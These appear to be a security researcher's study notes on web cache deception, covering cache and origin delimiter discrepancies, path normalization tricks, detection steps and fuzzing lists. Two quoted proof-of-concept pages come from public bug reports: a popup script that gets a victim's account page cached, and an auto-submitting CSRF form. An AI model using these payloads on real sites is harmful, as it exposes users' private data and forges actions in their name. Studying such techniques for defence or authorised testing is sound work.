# Web Caches + CDNS 

# Cache keys

# cache Busters 

# URL discrepancies 
## Delimiters
Spring : Semicolon (;)
Rails : Dot (.)
OpenLiteSpeed : Null encoded byte (%00)
Nginx : New encoded byte (%0a)

# Terminology
Origin Server : The server that serves the content AKA Backend server
Cache Proxy   : The server that caches the content AKA Frontend server
Load Balancer : The server that distributes the traffic to the origin server
Delimiter     : A character or string that separates the path from the query string [see more explanation below]

# Detecting Origin Delimiters 
1. Identify a non-cacheable request 
In that case we hope that what is appended is ignored by the frontend server and makes it to the backend  server.
2. Send the same request appending a random suffix at the end of the path 
> abc / ? # % ;
3. Send the same request appending a delimiter before the random suffix at the end of the path 
> abc / ? # % ;
If the messages are identical, the character or string is used as a delimiter.
Use Burp Intruder 
# & URL delimiters in the real world 
## CVE from web framework(bottle) using ; as delimiter 
https://security.snyk.io/vuln/SNYK-PYTHON-BOTTLE-1017108
https://snyk.io/blog/cache-poisoning-in-popular-open-source-packages
https://github.com/python/cpython/blob/main/Lib/urllib/parse.py#L739

What does a Delimiter mean or does exactly? The delimiter is a character, that when the url parser reaches it a logical stop in parsing is decided there whatever character/s that follows
at character is considered as not part of the URL.

# Why is this Important? 
Identifying and using the delimiter allows to essentially coerce the parser to stop parsing at an 
arbitrary section of the URL that we want. See where this is going? Meaning we can smuggle a payload to the other URL parser or pass the the cache server. In this case we are talking about the Origin Server i.e the application server or servers like nginx, apache, etc not the frontend cache server like cloudflare, etc.

# Detecting Cache Delimiters 
Cache servers often don't use delimiters aside from ?
1. Identify cacheable request
Because it is a cacheable request, we can be sure that at least the cache server will pay attention to it, parse it. 
2. Send same req with a potential delimiter and compare the response
> abc / ? # % 
> GET /static-endpoint<DELIMITER><Random>

# Normalization
URL parsers are used by both the cache and origin server to extract paths for endpoint mapping,
cache keys, and rules. First, path delimiters are identified to locate the start and end of the
pathname. Once the path is extracted, it's normalized to its absolute form by decoding characters
and removing dot-segments

# Encoding 
Sometimes, a delimiter character needs to be sent for interpretation by the application rather than
the HTTP parser. For such cases, the URI RFC defines URL encoding, which allows characters to
be encoded to avoid modifying the meaning of the pathname.

# Detecting decoding behaviors
To test if a character is being decoded, compare a base request with its encoded version.
Encode chars individually
example:
/home/index → /%68%6f%6d%65%2f%69%6e%64%65%78

# Dot-segment normalization
It's possible to exploit dot-segment normalization by leveraging the discrepancies between parsers
to modify the behavior of the cache rules and obtain crafted keys. 

# Detecting dot-segment normalization
To detect normalization in the origin server, issue a non-cacheable request (or a request with a
cache buster) to a known path, then send the same message with a path traversal sequence:
GET /home/index?cacheBuster
GET /aaa/../home/index?cacheBuster or 
GET /aaa%2F..%2Fhome/index?cacheBuster or 
GET /aaa\..\home/index?cacheBuster

# Normalization discrepancies
The following tables illustrate how different HTTP servers and web cache proxies normalize the
path /hello/..%2Fworld. Some resolve the path to /world, while others don't normalize it at all.

# Exploiting Web Cache Deception 
## Static file extensions / URL Mapping discrepancies
This is where the cache rule says the proxy should cache all files that ends with one of 
the static extensions it supports 
Here you add /test.js : A /(sometimes encoded) a random string(test) and a static file extension(.js)
Refer to the proxy static file extensions list 
https://developers.cloudflare.com/cache/concepts/default-cache-behavior/#default-cached-file-extensions

# How/Why it happens 
Proxy sees and pays attention to a.css
Server sees and ignores a.css
Cache Proxy                 Origin Server
/myAccount$a.css            /myAccount$a.css
/myAccount%23a.css          /myAccount#a.css 

Sometimes the Cache Proxy/LB/Frontend Server decodes before forwarding to the origin server
Load Balancer:              /myAccount%25%32%33a.css 
Cache Proxy:                /myAccount%23a.css  
Origin Server:              /myAccount#a.css 
If you are sending # in the browser, you need to encode it. Browsers don't send fragments to servers

# Static directories
Eg: Where to find them
Tip: Cache your browser network tap for which files are cached.
/static
/assets
/wp-content
/media
/templates
/public
/shared

# Exploiting static directories with delimiters
If a char is used as a delimiter by the Origin Server but not by the cache server and the 
cache server normalizes the path before applying a static directory rule, 
you can hide a path traversal segment after the delimiter, which the cache will resolve:

GET /<Dynamic_Resource><Delimiter><Encoded_Dot_Segment><Static_Directory>
CP normalizes req, applying the path traversal so it sees /static/any 
Origin Server uses $ as delimiter so it ignores $/..%2Fstatic/any and serves /myAccount
CP applying static directory rules caches /myAccount as /static/any 
Browser                        Cache Proxy      Origin Server
/myAccount$/..%2Fstatic/any    /static/any      /myAccount

Remember to test, the behavior of the CP 

# Exploiting static directories through Backend only normalization
The Origin Server normalizes the path before mapping the endpoint but the 
cache doesn't normalize the path before evaluating the cache rules, 
You can add a path traversal segment that will only be processed by the Origin Server:

GET /<Static_Directory><Encoded_Dot_Segment><Dynamic_Resource>
CP doesn't normalize encoding, forwards to Origin Server
Origin Server normalizes path traversal dot segments and server /myAccount 
CP caches response thinking it is under /static/
Browser                 Cache Proxy                 Origin Server
/static/..%2FmyAccount  /static/..%2FmyAccount      /myAccount

# Real world Exploit normalization
https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html
%2F..%2F

# Static files
Some files, like /robots.txt, /favicon.ico, and /index.html, 

Exploiting static files
Use the technique used in static directories where
the CP normalizes the req and there is a delimiter at backend. 
The static directory is replaced by the filename and a cache buster

GET /<Dynamic_Resource><Delimiter><Encoded_Dot_Segment><Static_File>
Browser                         Cache Proxy     Origin Server
/myAccount/..%2Frobots.txt      /robots.txt     /myAccount

# Understanding Our Cache and the Web Cache Deception Attack
https://blog.cloudflare.com/understanding-our-cache-and-the-web-cache-deception-attack/
Web cache deception lab delimiter list

!
"
#
$
%
&
'
(
)
*
+
,
-
.
/
:
;
<
=
>
?
@
[
\
]
^
_
`
{
|
}
~
%00
%0A
%09
%21
%22
%23
%24
%25
%26
%27
%28
%29
%2A
%2B
%2C
%2D
%2E
%2F
%3A
%3B
%3C
%3D
%3E
%3F
%40
%5B
%5C
%5D
%5E
%5F
%60
%7B
%7C
%7D
%7E 


Cloudflare Default static file extensions
7Z  
CSV  
GIF  
MIDI  
PNG  
TIF  
ZIP  
AVI  
DOC  
GZ  
MKV  
PPT  
TIFF  
ZST  
AVIF  
DOCX  
ICO  
MP3  
PPTX  
TTF  
APK  
DMG  
ISO  
MP4  
PS  
WEBM  
BIN  
EJS  
JAR  
OGG  
RAR  
WEBP  
BMP  
EOT  
JPG  
OTF  
SVG  
WOFF  
BZ2  
EPS  
JPEG  
PDF  
SVGZ  
WOFF2  
CLASS  
EXE  
JS  
PICT  
SWF  
XLS  
CSS  
FLAC  
MID  
PLS  
TAR  
XLSX  

# LYST Web Cache Poisoning POC Script 
https://hackerone.com/reports/631589
`
<html>
  <head> </head>
  <body>
    <script>
      var cachedUrl = "https://www.lyst.com/" + generateId() + ".css";
      const popup = window.open(cachedUrl);
      function generateId() {
        var content = "";
        const alphaWithNumber = "QWERTZUIOPASDFGHJUKLYXCVBNM1234567890";
        for (var i = 0; i < 10; i++) {
          content += alphaWithNumber.charAt(
            Math.floor(Math.random() * alphaWithNumber.length)
          );
        }
        return content;
      }
      var checker = setInterval(function () {
        if (popup.closed) {
          clearInterval(checker);
        }
      }, 200);
      var closer = setInterval(function () {
        popup.close();
        document.body.innerHTML =
          'Victims content is now cached <a href="' +
          cachedUrl +
          '">here and the url can be saved on the hackers server</a><br><b>Full Url: ' +
          cachedUrl +
          "</b>";
        clearInterval(closer);
      }, 3000);
    </script>
  </body>
</html>
`

https://zhero-web-sec.github.io/cache-deception-to-csrf/
Web Cache Deceptionce to CSRF form 
<html>
    <form id="csrf" enctype="application/x-www-form-urlencoded" method="POST" action="https://www.nope.com/nope">
        <table>
            <tr><td>firstname</td><td><input type="text" value="zhero" name="firstname"></td></tr>
            <tr><td>lastname</td><td><input type="text" value="powned" name="lastname"></td></tr>
            <tr><td>address1</td><td><input type="text" value="8 rue test" name="address1"></td></tr>
            <tr><td>address2</td><td><input type="text" value="test" name="address2"></td></tr>
            <tr><td>postcode</td><td><input type="text" value="44000" name="postcode"></td></tr>
            <tr><td>city</td><td><input type="text" value="Nantes" name="city"></td></tr>
            <tr><td>id_country</td><td><input type="text" value="10" name="id_country"></td></tr>
            <tr><td>id_state</td><td><input type="text" value="124" name="id_state"></td></tr>
            <tr><td>phone_mobile</td><td><input type="text" value="2342342342" name="phone_mobile"></td></tr>
            <tr><td>alias</td><td><input type="text" value="sdfsdfsdfsdf" name="alias"></td></tr>
            <tr><td>token</td><td><input type="text" value="b1a437c8d5d36fc6cd189e3aa849798e" name="token"></td></tr>
            <tr><td>submitAddress</td><td><input type="text" value="" name="submitAddress"></td></tr>
        </table>
    </form>
    <script>
        document.getElementById('csrf').submit()
    </script>
</html>